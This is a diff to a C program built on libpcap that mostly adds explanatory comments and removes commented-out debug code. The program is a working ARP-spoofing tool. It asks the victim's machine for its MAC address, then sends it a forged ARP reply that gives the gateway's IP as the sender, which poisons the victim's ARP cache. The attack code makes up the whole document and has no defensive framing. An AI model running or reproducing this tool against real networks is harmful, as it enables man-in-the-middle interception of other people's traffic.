@@ -138,6 +138,8 @@ int main(int argc, char* argv[]){
 		return 0;
 	}
 
+	// Fixed Packet (ARP, type reply, ...)
+
 	// type (ARP = 0x0806)
 	arp_data[12]=0x08;
 	arp_data[13]=0x06;
@@ -155,6 +157,7 @@ int main(int argc, char* argv[]){
 	arp_data[20]=0x00;
 	arp_data[21]=0x02;
 
+	// from input ip(argv), save target ip into targetip[]
 	chk = 0;
 	cnt = 0;
 	for(i=0;i<strlen(argv[1]);i++){
@@ -169,10 +172,12 @@ int main(int argc, char* argv[]){
 	}
 	targetip[cnt] = chk;
 
+	// target ip (38-41)
 	for(i=0;i<4;i++){
 		arp_data[38+i] = targetip[i];
 	}
 
+	// open device eth0
 	if(device == NULL){
 		if( (device = pcap_lookupdev(ebuf)) == NULL){
 			perror(ebuf);
@@ -185,36 +190,27 @@ int main(int argc, char* argv[]){
 		exit(-1);
 	}
 
+	// source MAC (6-11)
 	if(eth0_MAC(&arp_data[6]) == 0){
 		printf("Error : Writing my MAC address at packet ! \n");
 	}
+	// sender MAC (22-27)
 	if(eth0_MAC(&arp_data[22]) == 0){
 		printf("Error : Writing my MAC address at packet ! \n");
 	}
-	/*
-	if(eth0_IP(&arp_data[28]) == 1){
-		printf("my IP : ");
-		for(i=0;i<4;i++)
-			printf("%d.",arp_data[28+i]);
-		printf("\n");
-	}
-	else{
-		printf("error\n");
-	}
-	*/
-
+	// sender IP (28-31)  --  fake to victim
 	if(gatewayIP(&arp_data[28]) == 0){
 		printf("Error : Can't read gateway address! \n");
 	}
-
+	// generating ARP request for ask victim's MAC
 	if(make_request(req_data, targetip) == 0){
 		printf("Error : Making Request \n");
 	}
-
+	// send ARP request to victim (broadcast)
 	if(pcap_sendpacket(pd,req_data,42) != 0){
 		printf("Error : Sending request packet!\n");
 	}
-
+	// receive ARP reply to get victim's MAC
 	while((res = pcap_next_ex( pd, &header, &pkt_data)) >= 0){
 		if(res == 0)
 		/* Timeout elapsed */
@@ -228,15 +224,6 @@ int main(int argc, char* argv[]){
 		else{ // It's ARP !
 			if( ntohs(*((unsigned short*)(&pkt_data[20]))) == 0x0002 ){
 				if( ((unsigned int*)(&pkt_data[28]))[0] == ((unsigned int*)(&req_data[38]))[0] ){
-					/*
-					printf("     Target's Mac   ");
-					printf("%02x",pkt_data[6]);
-					for(i=7;i<12;i++){
-						printf(":");
-						printf("%02x", pkt_data[i]);
-					}
-					printf("\n");
-					*/
 					for(i=0;i<6;i++){
 						arp_data[i] = pkt_data[6+i];
 						arp_data[32+i] = pkt_data[6+i];
@@ -251,81 +238,10 @@ int main(int argc, char* argv[]){
 		return -1;
 	}
 
+	// send ARP spoofing packet
 	if(pcap_sendpacket(pd,arp_data,42) != 0){
 		printf("Error : Sending request packet!\n");
 	}
-
-
-/*
-	printf("gateway IP : ");
-	for(i=0;i<4;i++)
-		printf("%d.",arp_data[28+i]);
-	printf("\n");
-
-
-	printf("target IP : ");
-	for(i=0;i<4;i++)
-		printf("%d.",arp_data[38+i]);
-	printf("\n");
-*/
-
-/*
-	// destination MAC
-	// memcpy(d_mac,packetadressadress,6)
-	arp_data[0]=
-	arp_data[1]=
-	arp_data[2]=
-	arp_data[3]=
-	arp_data[4]=
-	arp_data[5]=
-	// source MAC
-	arp_data[6]=
-	arp_data[7]=
-	arp_data[8]=
-	arp_data[9]=
-	arp_data[10]=
-	arp_data[11]=
-	// type (ARP = 0x0806)
-	arp_data[12]=0x08;
-	arp_data[13]=0x06;
-	// Ethernet = 0x0001
-	arp_data[14]=0x00;
-	arp_data[15]=0x01;
-	// IP = 0x0800
-	arp_data[16]=0x08;
-	arp_data[17]=0x00;
-	// MAC length (06)
-	arp_data[18]=0x06;
-	// IP length (04)
-	arp_data[19]=0x04;
-	// ARP type ( reply = 0x0002 )
-	arp_data[20]=0x00;
-	arp_data[21]=0x02;
-	// Sender MAC
-	arp_data[22]=
-	arp_data[23]=
-	arp_data[24]=
-	arp_data[25]=
-	arp_data[26]=
-	arp_data[27]=
-	// Sender IP
-	arp_data[28]=
-	arp_data[29]=
-	arp_data[30]=
-	arp_data[31]=
-	// Target MAC
-	arp_data[32]=
-	arp_data[33]=
-	arp_data[34]=
-	arp_data[35]=
-	arp_data[36]=
-	arp_data[37]=
-	// Target IP
-	arp_data[38]=
-	arp_data[39]=
-	arp_data[40]=
-	arp_data[41]=
-*/
 
 	return 0;
 }
